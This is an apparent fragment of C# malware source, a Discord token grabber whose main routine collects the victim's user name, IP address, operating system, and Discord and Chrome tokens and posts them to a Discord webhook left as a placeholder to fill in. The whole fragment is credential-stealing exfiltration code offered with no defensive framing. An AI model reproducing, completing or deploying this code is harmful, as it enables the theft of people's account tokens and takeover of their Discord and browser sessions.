        ...
        static void Main()
        {
            ...
            using (DcWebHook dcWeb = new DcWebHook())
            {
                ...
                foreach (ManagementObject managementObject in mos.Get())
                {
                    ...
                    dcWeb.WebHook = "WEBHOOK URL HERE"; 
                    dcWeb.SendMessage("```" + "PC Name: " + Environment.UserName + Environment.NewLine + "IP: " + GetIPAddress() + Environment.NewLine + dcWeb.UserName + Environment.NewLine + "OS: " + OSName + Environment.NewLine + "Token DiscordAPP: " + string2 + Environment.NewLine + "Token Chrome: " + string4 + "```");
                }
            }
        }
